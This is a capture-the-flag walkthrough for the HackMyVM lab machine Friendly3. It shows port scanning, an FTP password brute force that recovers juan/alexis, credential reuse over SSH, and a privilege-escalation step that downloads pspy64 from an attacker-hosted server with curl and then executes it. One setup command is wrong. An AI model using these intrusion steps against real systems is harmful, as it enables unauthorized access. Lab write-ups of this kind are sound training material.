---
tags:
  - WalkThrough
  - "#Machine"
  - "#RiJaba1"
  - FTP
  - "#Port_80"
  - Port_21
Created: 2023-10-12 15:15
---
# Description
Friendly3 is a beginner machine created by [RiJaba1](https://twitter.com/RiJaba1Official) 
<p align="center">
<img src="https://github.com/CesarGBkR/Pentesting-Notes/blob/main/Labs/Hack%20My%20VM%20(HMVM)/attachments/image-removebg-preview.png?raw=true" width="100" height="100">
</p>
#  Friendly3
## Walk through
### Enumeration
#### Port Enumeration 
Basic PORT enumeration with NMAP
```Bash
nmap -Pn -n -p- --min-rate 5000 --open $TARGET
```
*Note: in my case $TARGET is 192.168.1.69*

The reported ports are
```Bash
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

#### Service Enumeration 
Now lets enumerate the services running on each port with
```Bash
nmap -sCV -p $PORTS --min-rate 5000 $TARGET
```

Output
```Bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey: 
|   256 bc:46:3d:85:18:bf:c7:bb:14:26:9a:20:6c:d3:39:52 (ECDSA)
|_  256 7b:13:5a:46:a5:62:33:09:24:9d:3e:67:b6:eb:3f:a1 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.22.1
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

#### Port 80
Open the web reported we can see a semi void web, but trying to get the biggest amount of info from our fonts, we can get a name *juan* 
<p align="center">
<img src="https://github.com/CesarGBkR/Pentesting-Notes/blob/main/Labs/Hack%20My%20VM%20(HMVM)/attachments/Pasted%20image%2020231012160624.png?raw=true" width="700">
</p>
#### Port 21
The FTP service don't have anonymous user based on the Service Enumeration
Lets try with a Brute Force Attack to get the credentials of the possible user *juan*
In this case I go to use Hydra but exist more Tools to do this. Take a look [here](https://null-byte.wonderhowto.com/how-to/brute-force-ftp-credentials-get-server-access-0208763/) for more info.
Yeah, we has luck, the password for the user *juan* is *alexis*
<p align="center">
<img src="https://github.com/CesarGBkR/Pentesting-Notes/blob/main/Labs/Hack%20My%20VM%20(HMVM)/attachments/Pasted%20image%2020231012160438.png?raw=true" width="700">
</p>
### Exploitation
Use the credentials to FTP
<p align="center">
<img src="https://github.com/CesarGBkR/Pentesting-Notes/blob/main/Labs/Hack%20My%20VM%20(HMVM)/attachments/Pasted%20image%2020231012162532.png?raw=true" width="700">
</p>
Nothing seems interesting, every file is empty or with junk info
<p align="center">
<img src="https://github.com/CesarGBkR/Pentesting-Notes/blob/main/Labs/Hack%20My%20VM%20(HMVM)/attachments/Pasted%20image%2020231012162639.png?raw=true" width="700">
</p>
#### User flag
We can try to reuse the credentials in the other open service, SSH *juan* for user *alexis* for password
<p align="center">
<img src="https://github.com/CesarGBkR/Pentesting-Notes/blob/main/Labs/Hack%20My%20VM%20(HMVM)/attachments/Pasted%20image%2020231012163231.png?raw=true" width="700">
</p>
It works
Type *ls* and you go to see the *user* flag
<p align="center">
<img src="https://github.com/CesarGBkR/Pentesting-Notes/blob/main/Labs/Hack%20My%20VM%20(HMVM)/attachments/Pasted%20image%2020231012163432.png?raw=true" width="700">
</p>
### Post-Explotation
#### Privilege Escalation
*Juan* do't have *sudo* permissions to do *sudo -l*
Let's do the basics I go to try to explore the current process with PSPY
Download in your **ATTACKER** machine the binary from [here](https://github.com/DominicBreuker/pspy)
Download in your Attacker machine the Pspy64 from [here](https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64)
After download your Pspy open a http server to transfer your file

If you don't know how to do that follow this instructions
```Bash
python pip install http.server
python -m http.server 80
```

Use curl to request the file from the **TARGET** machine in the Path */tmp*
```Bash
curl -X GET http://$ATTACKER/pspy64 -o pspy64
```
<p align="center">
<img src="https://github.com/CesarGBkR/Pentesting-Notes/blob/main/Labs/Hack%20My%20VM%20(HMVM)/attachments/Pasted%20image%2020231012190844.png?raw=true" width="700">
</p>
Then add execution permissions and execute it
```Bash
chmod +x pspy64
./pspy64
```


#### Root flag
<p align="center">
<img src="https://github.com/CesarGBkR/Pentesting-Notes/blob/main/Labs/Hack%20My%20VM%20(HMVM)/attachments/Pasted%20image%2020231012175012.png?raw=true" width="700">
</p>
# References

https://null-byte.wonderhowto.com/how-to/brute-force-ftp-credentials-get-server-access-0208763/

https://github.com/DominicBreuker/pspy

https://github.com/CesarGBkR/HackingBasics/tree/main/Writeups/TCM/PEH